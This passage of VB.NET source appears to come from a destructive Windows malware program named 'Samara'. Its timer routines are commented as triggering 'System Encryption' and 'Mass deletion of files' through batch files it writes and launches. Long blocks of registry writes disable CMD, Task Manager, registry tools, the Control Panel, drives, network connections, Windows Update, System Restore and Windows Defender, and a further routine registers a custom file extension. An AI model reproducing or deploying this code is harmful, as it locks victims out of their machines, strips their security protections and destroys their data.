        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000 'Set trackbar to valid range, since if will be half, the lower range is invalid
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True
Err:
    End Sub

    Private Sub Timer4_Tick(sender As Object,
                            e As EventArgs) Handles Timer4.Tick
        On Error GoTo Err
        Timer4.Stop()
        Timer2.Start()
        Using CD As New ColorDialog
            Dim BackgroundColor As Integer = ColorTranslator.ToWin32(Color.DarkSlateBlue)
            SetSysColors(1, 1, BackgroundColor)
        End Using

        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000 'Set trackbar to valid range, since if will be half, the lower range is invalid
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True
        'This goes with changing Desktop Wallpaper
Err:
    End Sub

    'This we fire off 5 seconds after the app starts so GPO has time to schedule its task 
    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Timer5.Stop()
        'Disable CMD
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Policies\System\DisableCMD", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Policies\System\DisableCMD", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        'Disable Registry Tools
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
    End Sub

    'System Encryption
    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick
        Timer6.Stop()
        Dead_Meadow()
    End Sub

    'Mass deletion of files
    Private Sub Timer7_Tick(sender As Object, e As EventArgs) Handles Timer7.Tick
        Timer7.Stop()
        Chromosome26()
        HyperNova() 'Bat create & launch
        DayStar() 'Bat create & launch
        Nucleus() 'Bat create & launch
    End Sub
#End Region

#Region "Drive Removal | Registry Privileges Revoked "
    'Here we choose "CurrentUser" because "LocalMachine" requires admin. If the admin is already logged on
    'then our job task below will see them as a CurrentUser.
    Private Sub AllDrivesGone()
        On Error GoTo Err
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", "Samara", 67108863, RegistryValueKind.DWord) 'All: Drive
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", True).SetValue("Samara", 67108863, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecycleFiles", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecycleFiles", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNtSecurity", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNtSecurity", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Programs\NoProgramsCPL", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Programs\NoProgramsCPL", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{031E4825-7B94-4dc3-B131-E946B44C8DD5}}", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{031E4825-7B94-4dc3-B131-E946B44C8DD5}}", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetworkConnections", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetworkConnections", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoManageMyComputerVerb", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoManageMyComputerVerb", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If


Err:
    End Sub

    Private Sub Slapper()
        On Error GoTo Err
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", True).SetValue("Samara", 1, RegistryValueKind.DWord)

            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictCpl", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictCpl", True).SetValue("Samara", 1, RegistryValueKind.DWord)

            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowCpl", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowCpl", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell\EdgeUI\DisableTLcorner", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell\EdgeUI\DisableTLcorner", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        'Disable Task Manager
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        'Disable Network Connection
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetworkConnections", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetworkConnections", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKLM\Software\Policies\Microsoft\MRT\DontOfferThroughWUAU", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKLM\Software\Policies\Microsoft\MRT\DontOfferThroughWUAU", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKLM\System\CurrentControlSet\Services\WinDefend\Start", "Samara", 4, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKLM\System\CurrentControlSet\Services\WinDefend\Start", True).SetValue("Samara", 4, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ForceStartMenuLogoff", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ForceStartMenuLogoff", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\LockTaskbar", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\LockTaskbar", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("Samara") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("Samara") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue($"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel{{59031a47-3f72-44a7-89c5-5595fe6b30ee}}", "Samara", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey($"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel{{59031a47-3f72-44a7-89c5-5595fe6b30ee}}", True).SetValue("Samara", 1, RegistryValueKind.DWord)
        End If
Err:
    End Sub

#End Region

#Region "Registry Hive"
    'Create's your own custom file extension into registry hive.
    Public Enum KeyHiveSmall
        ClassesRoot
        CurrentUser
        LocalMachine
    End Enum
    'Custom file extension into registry hive
    Public Shared Sub CreateAssociation(ProgID As String, extension As String, description As String, application As String, icon As String, Optional hive As KeyHiveSmall = KeyHiveSmall.CurrentUser)
        Dim selectedKey As RegistryKey = Nothing

        Select Case hive
            Case KeyHiveSmall.ClassesRoot
                Registry.ClassesRoot.CreateSubKey(extension).SetValue(".samara", ProgID)
                selectedKey = Registry.ClassesRoot.CreateSubKey(ProgID)
            Case KeyHiveSmall.CurrentUser
                Registry.CurrentUser.CreateSubKey("Software\Classes\" & extension).SetValue(".samara", ProgID)
                selectedKey = Registry.CurrentUser.CreateSubKey("Software\Classes\" & ProgID)
            Case KeyHiveSmall.LocalMachine
                Registry.LocalMachine.CreateSubKey("Software\Classes\" & extension).SetValue(".samara", ProgID)
                selectedKey = Registry.LocalMachine.CreateSubKey("Software\Classes\" & ProgID)
        End Select

        If selectedKey IsNot Nothing Then

            If description IsNot Nothing Then
                selectedKey.SetValue("Samara", description)
            End If

            If icon IsNot Nothing Then
                selectedKey.CreateSubKey("DefaultIcon").SetValue("", icon, RegistryValueKind.ExpandString)
                selectedKey.CreateSubKey("Shell\Open").SetValue("icon", icon, RegistryValueKind.ExpandString)
            End If

            If application IsNot Nothing Then
                selectedKey.CreateSubKey("Shell\Open\command").SetValue("", """" & application & """" & " ""%1""", RegistryValueKind.ExpandString)
            End If
        End If

        selectedKey.Flush()
        selectedKey.Close()
    End Sub

    Public Shared Sub SelfCreateAssociation(extension As String, Optional hive As KeyHiveSmall = KeyHiveSmall.CurrentUser, Optional description As String = "")
        Dim ProgID As String = Reflection.Assembly.GetExecutingAssembly().EntryPoint.DeclaringType.FullName
        Dim FileLocation As String = Reflection.Assembly.GetExecutingAssembly().Location
        CreateAssociation(ProgID, extension, description, FileLocation, FileLocation & ",0", hive)
    End Sub
#End Region


    Sub ReleaseRAM()
        Try
            GC.Collect()
            GC.WaitForPendingFinalizers()
            If Environment.OSVersion.Platform = PlatformID.Win32NT Then
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
            End If
        Catch ex As Exception
            MsgBox(ex.ToString())
        End Try
    End Sub

End Class